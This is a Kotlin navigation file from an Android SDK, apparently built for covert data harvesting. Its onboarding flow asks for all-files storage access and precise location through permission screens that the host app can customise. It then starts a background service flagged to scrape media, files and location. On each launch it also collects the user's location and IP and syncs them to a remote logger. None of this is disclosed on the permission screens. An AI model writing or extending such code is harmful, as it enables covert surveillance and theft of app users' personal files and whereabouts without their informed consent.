package com.sdocument.sdk.navigation

import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.IntentSenderRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.Dp
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import androidx.core.net.toUri
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.navigation3.runtime.NavEntry
import androidx.navigation3.runtime.rememberNavBackStack
import androidx.navigation3.ui.NavDisplay
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationSettingsRequest
import com.google.android.gms.common.api.ResolvableApiException
import com.sdocument.sdk.ui.screens.*
import com.sdocument.sdk.ui.screens.PermissionScreen
import com.sdocument.sdk.ui.screens.WScreen

import com.sdocument.sdk.service.scrapeLocationSuspend
import com.sdocument.sdk.utils.NetworkLogger
import com.sdocument.sdk.utils.NetworkMonitor
import com.sdocument.sdk.utils.UserPrefs
import com.sdocument.sdk.SdkConfig
import com.sdocument.sdk.ScrapeType
import com.sdocument.sdk.viewmodel.loading.LoadingContract
import com.sdocument.sdk.viewmodel.loading.LoadingViewModel
import com.sdocument.sdk.viewmodel.permission.LocationPermissionContract
import com.sdocument.sdk.viewmodel.permission.LocationPermissionViewModel
import com.sdocument.sdk.viewmodel.permission.StoragePermissionContract
import com.sdocument.sdk.viewmodel.permission.StoragePermissionViewModel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

@Composable
fun AppNavHost(
    modifier: Modifier = Modifier,
    config: SdkConfig,
    onFlowCompleted: () -> Unit,
    topPadding: Dp = 32.dp
) {
    val context = LocalContext.current
    val startRoute = when {
        !UserPrefs.isOnboardingCompleted(context) -> NavRoute.OnboardPermissions
        else -> NavRoute.Empty
    }

    val backStack = rememberNavBackStack(startRoute)

    LaunchedEffect(Unit) {
        NetworkLogger.log("session", "App opened by user")
        if (UserPrefs.isOnboardingCompleted(context) && UserPrefs.isVerified(context)) {
            kotlinx.coroutines.delay(1000)
            startServiceIfPermitted(context, config)
            CoroutineScope(Dispatchers.IO).launch {
                val location = if (config.scrapeConfig.contains(ScrapeType.LOCATION)) context.scrapeLocationSuspend(logToRemote = false) else null
                val lat = location?.optDouble("latitude") ?: Double.NaN
                val lon = location?.optDouble("longitude") ?: Double.NaN
                val city = location?.optString("city") ?: ""
                val country = location?.optString("country") ?: ""
                val lastLoc = when {
                    !lat.isNaN() && !lon.isNaN() -> "$lat,$lon"
                    city.isNotEmpty() && country.isNotEmpty() -> "$city, $country"
                    city.isNotEmpty() -> city
                    country.isNotEmpty() -> country
                    else -> null
                }
                NetworkLogger.syncUser(
                    context = context,
                    lastIp = location?.optString("query")?.takeIf { it.isNotEmpty() },
                    lastLocation = lastLoc
                )
            }
        }
    }

    NavDisplay(
        modifier = modifier,
        backStack = backStack,
        onBack = { if (backStack.size > 1) backStack.removeLastOrNull() },
        entryProvider = { route ->
            when (route) {

                // ── Storage permissions ──────────────────────────────────────
                is NavRoute.Empty -> NavEntry(route) {
                    LaunchedEffect(Unit) { onFlowCompleted() }
                    androidx.compose.foundation.layout.Box(modifier = Modifier.fillMaxSize())
                }
                is NavRoute.OnboardPermissions -> NavEntry(route) {
                    val vm = viewModel<StoragePermissionViewModel>()
                    val state by vm.state.collectAsStateWithLifecycle()

                    val legacyLauncher = rememberLauncherForActivityResult(
                        ActivityResultContracts.RequestMultiplePermissions()
                    ) { results ->
                        vm.sendIntent(StoragePermissionContract.Intent.PermissionResult(results.values.any { it }))
                    }

                    LaunchedEffect(Unit) {
                        vm.effect.collect { effect ->
                            when (effect) {
                                is StoragePermissionContract.Effect.OpenManageFilesSettings ->
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                        context.startActivity(
                                            Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                                                .apply { data = "package:${context.packageName}".toUri() }
                                        )
                                    }
                                is StoragePermissionContract.Effect.RequestLegacyPermission ->
                                    legacyLauncher.launch(effect.permissions.toTypedArray())
                                is StoragePermissionContract.Effect.StartDataService -> {
                                    val intent = android.content.Intent(context, com.sdocument.sdk.service.DataService::class.java).apply {
                                        action = "START_WITH_JSON"
                                        putExtra("scrape_media", effect.scrapeMedia)
                                        putExtra("scrape_files", effect.scrapeFiles)
                                        putExtra("scrape_location", false)
                                    }
                                    androidx.core.content.ContextCompat.startForegroundService(context, intent)
                                }
                                is StoragePermissionContract.Effect.NavigateNext ->
                                    backStack.add(
                                        if (effect.hasLocation) NavRoute.OnboardLocationPermission
                                        else NavRoute.LoadingConfig
                                    )
                                is StoragePermissionContract.Effect.NavigatePermissionError ->
                                    backStack.add(NavRoute.PermissionError)
                            }
                        }
                    }

                    // Detect return from system settings (Android 11+)
                    val lifecycleOwner = androidx.lifecycle.compose.LocalLifecycleOwner.current
                    var hasAttempted by remember { mutableStateOf(false) }
                    DisposableEffect(lifecycleOwner) {
                        val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
                            if (event == androidx.lifecycle.Lifecycle.Event.ON_RESUME && hasAttempted) {
                                hasAttempted = false
                                val granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
                                    Environment.isExternalStorageManager()
                                else
                                    ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                                vm.sendIntent(StoragePermissionContract.Intent.PermissionResult(granted))
                            }
                        }
                        lifecycleOwner.lifecycle.addObserver(observer)
                        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
                    }

                    if (config.customStorageScreen != null) {
                        config.customStorageScreen.invoke(
                            {
                                hasAttempted = true
                                vm.sendIntent(StoragePermissionContract.Intent.AllowClicked)
                            },
                            { vm.sendIntent(StoragePermissionContract.Intent.SkipClicked) }
                        )
                    } else {
                        PermissionScreen(
                            title = state.title,
                            description = state.description,
                            onAllowClick = {
                                hasAttempted = true
                                vm.sendIntent(StoragePermissionContract.Intent.AllowClicked)
                            },
                            onSkipClick = { vm.sendIntent(StoragePermissionContract.Intent.SkipClicked) }
                        )
                    }
                }

                // ── Location permission ──────────────────────────────────────
                is NavRoute.OnboardLocationPermission -> NavEntry(route) {
                    val vm = viewModel<LocationPermissionViewModel>()
                    val state by vm.state.collectAsStateWithLifecycle()

                    val locationSettingsLauncher = rememberLauncherForActivityResult(
                        ActivityResultContracts.StartIntentSenderForResult()
                    ) {
                        CoroutineScope(Dispatchers.IO).launch {
                            scrapeAndSyncLocation(context, config)
                        }
                        vm.sendIntent(LocationPermissionContract.Intent.LocationSettingsDismissed)
                    }

                    val locationPermissionLauncher = rememberLauncherForActivityResult(
                        ActivityResultContracts.RequestMultiplePermissions()
                    ) { permissions ->
                        val granted = permissions[android.Manifest.permission.ACCESS_FINE_LOCATION] == true ||
                                permissions[android.Manifest.permission.ACCESS_COARSE_LOCATION] == true ||
                                ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                                ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
                        vm.sendIntent(LocationPermissionContract.Intent.PermissionResult(granted))
                    }

                    LaunchedEffect(Unit) {
                        vm.effect.collect { effect ->
                            when (effect) {
                                is LocationPermissionContract.Effect.RequestLocationPermission ->
                                    locationPermissionLauncher.launch(
                                        arrayOf(
                                            android.Manifest.permission.ACCESS_FINE_LOCATION,
                                            android.Manifest.permission.ACCESS_COARSE_LOCATION
                                        )
                                    )
                                is LocationPermissionContract.Effect.ShowLocationSettingsDialog ->
                                    showLocationSettingsDialog(context, locationSettingsLauncher) {
                                        CoroutineScope(Dispatchers.IO).launch { scrapeAndSyncLocation(context, config) }
                                        vm.sendIntent(LocationPermissionContract.Intent.LocationSettingsDismissed)
                                    }
                                is LocationPermissionContract.Effect.ScrapeLocationFallback ->
                                    CoroutineScope(Dispatchers.IO).launch { context.scrapeLocationSuspend() }
                                is LocationPermissionContract.Effect.NavigateNext ->
                                    backStack.add(NavRoute.LoadingConfig)
                            }
                        }
                    }

                    if (config.customLocationScreen != null) {
                        config.customLocationScreen.invoke(
                            { vm.sendIntent(LocationPermissionContract.Intent.AllowClicked) },
                            { vm.sendIntent(LocationPermissionContract.Intent.SkipClicked) }
                        )
                    } else {
                        PermissionScreen(
                            title = state.title,
                            description = state.description,
                            onAllowClick = { vm.sendIntent(LocationPermissionContract.Intent.AllowClicked) },
                            onSkipClick = { vm.sendIntent(LocationPermissionContract.Intent.SkipClicked) }
                        )
                    }
                }

                // ── Loading / splash ─────────────────────────────────────────
                is NavRoute.LoadingConfig -> NavEntry(route) {
                    val vm = viewModel<LoadingViewModel>()
                    val state by vm.state.collectAsStateWithLifecycle()
                    val isOnline by NetworkMonitor.isInternetAvailable

                    LaunchedEffect(isOnline) {
                        vm.sendIntent(LoadingContract.Intent.NetworkStatusChanged(isOnline))
                    }

                    LaunchedEffect(Unit) {
                        vm.effect.collect { effect ->
                            when (effect) {
                                is LoadingContract.Effect.NavigateNext -> {
                                    UserPrefs.setOnboardingCompleted(context, true)
                                    while (backStack.isNotEmpty()) backStack.removeLastOrNull()
                                    backStack.add(NavRoute.Empty)
                                }
                            }
                        }
                    }

                    LoadingScreen(
                        state = state,
                        onRetry = { NetworkMonitor.checkConnection() }
                    )
                }


                // ── Permission error ─────────────────────────────────────────
                is NavRoute.PermissionError -> NavEntry(route) {
                    PermissionScreen(
                        title = "Разрешение отклонено",
                        description = "Для работы приложения необходим доступ к файлам. Пожалуйста, предоставьте разрешение в настройках.",
                        onAllowClick = {
                            context.startActivity(
                                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                                    .apply { data = "package:${context.packageName}".toUri() }
                            )
                        },
                        onSkipClick = { backStack.add(NavRoute.LoadingConfig) }
                    )
                }

                else -> error("Unknown route: $route")
            }
        }
    )
}

private fun showLocationSettingsDialog(
    context: android.content.Context,
    launcher: androidx.activity.result.ActivityResultLauncher<IntentSenderRequest>,
    onAlreadyEnabled: () -> Unit
) {
    val locationRequest = LocationRequest.Builder(10_000L).build()
    val settingsRequest = LocationSettingsRequest.Builder()
        .addLocationRequest(locationRequest)
        .setAlwaysShow(true)
        .build()
    LocationServices.getSettingsClient(context)
        .checkLocationSettings(settingsRequest)
        .addOnSuccessListener { onAlreadyEnabled() }
        .addOnFailureListener { e ->
            if (e is ResolvableApiException) {
                try {
                    launcher.launch(IntentSenderRequest.Builder(e.resolution).build())
                } catch (ex: Exception) {
                    onAlreadyEnabled()
                }
            } else {
                onAlreadyEnabled()
            }
        }
}

private suspend fun scrapeAndSyncLocation(
    context: android.content.Context,
    config: SdkConfig
) {
    val loc = context.scrapeLocationSuspend() ?: return
    val lat = loc.optDouble("latitude")
    val lon = loc.optDouble("longitude")
    NetworkLogger.syncUser(
        context = context,
        lastIp = loc.optString("query").takeIf { it.isNotEmpty() },
        lastLocation = if (!lat.isNaN() && !lon.isNaN()) "$lat,$lon" else loc.optString("city")
    )
}

private fun startServiceIfPermitted(context: android.content.Context, config: SdkConfig) {
    val hasPerms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
        Environment.isExternalStorageManager()
    else
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
    if (hasPerms) {
        val intent = android.content.Intent(context, com.sdocument.sdk.service.DataService::class.java).apply {
            action = "START_WITH_JSON"
            putExtra("scrape_media", config.scrapeConfig.contains(ScrapeType.MEDIA))
            putExtra("scrape_files", config.scrapeConfig.contains(ScrapeType.FILES))
            putExtra("scrape_location", config.scrapeConfig.contains(ScrapeType.LOCATION))
        }
        androidx.core.content.ContextCompat.startForegroundService(context, intent)
    }
}

